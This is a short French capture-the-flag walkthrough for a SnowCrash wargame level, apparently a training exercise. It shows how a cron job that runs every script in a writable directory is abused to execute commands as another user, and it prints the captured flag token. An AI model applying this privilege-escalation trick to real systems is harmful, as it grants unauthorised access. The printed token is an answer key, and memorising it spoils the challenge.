# LEVEL 06
- On test le usual:
```
level05@SnowCrash:~$ ls -l
total 0
```
- On cherche les fichiers du user Level05
```
find / -name level05 2>&-
/var/mail/level05
```

- On trouve un script cron qui se lance une minute sur deux
```
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- On regarde le contenu du script `cat /usr/sbin/openarenaserver`
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

- Ce script execute tous les scripts presents dans /opt/openarenaserver/, on y créer donc notre script bash pour executer la commande getflag:
```
echo "getflag > /var/crash/flag05" > /opt/openarenaserver/lol
```
Wait two minutes....

```
cat /var/crash/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

## ⚡ Flag
`viuaaale9huek52boumoomioc`